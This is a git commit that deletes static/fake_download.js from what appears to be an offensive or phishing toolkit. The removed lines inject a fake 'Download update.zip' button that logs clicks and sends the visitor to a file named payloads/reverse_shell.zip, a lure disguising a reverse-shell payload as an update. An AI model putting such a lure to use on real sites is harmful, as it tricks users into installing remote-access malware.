83606173a09a87eabd3e6cd0416a96764056895c
ekomsSavior <161806886+ekomsSavior@users.noreply.github.com>
2025-05-31 14:48:13 -0700

    Delete static/fake_download.js

--- static/fake_download.js
+++
@@ -1,8 +0,0 @@
-const btn = document.createElement("button");
-btn.innerText = "Download update.zip";
-btn.style = "position:fixed;bottom:30px;right:30px;padding:10px;background:#0f0;color:#000;font-weight:bold;";
-btn.onclick = () => {
-  fetch("/log?dlclick=clicked");
-  window.location = "/payloads/reverse_shell.zip";
-};
-document.body.appendChild(btn);
